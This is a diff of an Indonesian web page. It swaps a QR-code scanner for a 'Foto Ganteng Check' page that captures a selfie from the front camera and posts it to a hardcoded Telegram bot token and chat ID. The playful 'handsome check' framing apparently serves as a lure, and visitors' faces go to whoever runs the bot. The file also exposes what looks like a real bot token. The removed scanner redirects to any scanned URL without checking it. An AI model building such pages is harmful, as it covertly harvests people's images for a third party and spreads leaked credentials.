@@ -1,112 +1,64 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>QR Code Scanner</title>
-  <script src="https://unpkg.com/html5-qrcode/minified/html5-qrcode.min.js"></script>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      overflow: hidden;
-      background: url('xyzen.jpg') no-repeat center center fixed;
-      background-size: cover;
-    }
-
-    .container {
-      padding: 20px;
-      background-color: rgba(0, 0, 0, 0.7);
-      margin: 50px auto;
-      width: 90%;
-      max-width: 400px;
-      border-radius: 10px;
-    }
-
-    h1 {
-      margin: 0;
-      padding: 10px;
-      color: #fff;
-    }
-
-    #reader {
-      margin: 20px auto;
-      width: 300px;
-      height: 300px;
-      border: 2px solid #fff;
-      background: #000;
-      border-radius: 10px;
-      overflow: hidden;
-    }
-
-    #result {
-      margin-top: 20px;
-      font-size: 18px;
-      color: #fff;
-    }
-
-    .notification {
-      margin-top: 20px;
-      font-size: 16px;
-      color: yellow;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Foto Ganteng Check</title>
 </head>
 <body>
-  <div class="container">
-    <h1>QR Code Scanner</h1>
-    <div id="reader"></div>
-    <p id="result">Arahkan kamera ke QR Code untuk memindai.</p>
-    <p class="notification" id="notification">Memeriksa izin kamera...</p>
-  </div>
+    <h1>Cek Ganteng</h1>
+    <video id="video" autoplay playsinline width="320" height="240"></video>
+    <button id="capture">Ambil Foto</button>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureBtn = document.getElementById('capture');
+        const ctx = canvas.getContext('2d');
 
-  <script>
-    const notificationElement = document.getElementById("notification");
+        // Mendapatkan akses ke kamera
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Gagal mengakses kamera: ", err);
+            });
 
-    // Fungsi untuk memulai QR Code Scanner
-    const startScanner = () => {
-      const qrCodeSuccessCallback = (decodedText, decodedResult) => {
-        console.log(`Decoded text: ${decodedText}`);
-        // Redirect ke URL yang ditemukan
-        window.location.href = decodedText;
-      };
+        // Tangkap foto
+        captureBtn.addEventListener('click', () => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/jpeg'); // Konversi gambar ke Base64
+            kirimKeBot(imageData);
+        });
 
-      const qrCodeErrorCallback = (errorMessage) => {
-        console.error(`QR Code Error: ${errorMessage}`);
-      };
+        // Kirim ke bot Telegram
+        function kirimKeBot(imageData) {
+            const botToken = "7731127818:AAFXHVuZzJ20kKc4-csHjWDa6oBg1kDyIhY"; // Token bot Anda
+            const chatId = "6692083976"; // Chat ID Anda
 
-      const html5QrCode = new Html5Qrcode("reader");
-      const config = { fps: 10, qrbox: { width: 250, height: 250 } };
-
-      // Mulai kamera (gunakan kamera belakang)
-      html5QrCode.start(
-        { facingMode: "environment" }, // Kamera belakang
-        config,
-        qrCodeSuccessCallback,
-        qrCodeErrorCallback
-      ).catch(err => {
-        console.error(`Tidak bisa memulai kamera: ${err}`);
-        notificationElement.textContent = "Tidak dapat mengakses kamera. Periksa izin kamera Anda.";
-        notificationElement.style.color = "red";
-      });
-    };
-
-    // Periksa akses kamera
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })
-      .then((stream) => {
-        // Jika izin diberikan
-        notificationElement.textContent = "Kamera belakang siap. Silakan arahkan ke QR Code.";
-        notificationElement.style.color = "green";
-        startScanner();
-      })
-      .catch((err) => {
-        // Jika izin ditolak
-        console.error(`Izin kamera ditolak: ${err}`);
-        notificationElement.textContent = "Izin kamera diperlukan untuk memindai QR Code. Harap aktifkan izin kamera.";
-        notificationElement.style.color = "red";
-      });
-  </script>
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    photo: imageData
+                }),
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("Foto berhasil dikirim ke bot Telegram!");
+                } else {
+                    console.error("Gagal mengirim foto: ", data);
+                    alert("Terjadi kesalahan saat mengirim foto.");
+                }
+            })
+            .catch(err => {
+                console.error("Kesalahan koneksi: ", err);
+                alert("Gagal mengirim foto. Periksa koneksi Anda.");
+            });
+        }
+    </script>
 </body>
 </html>
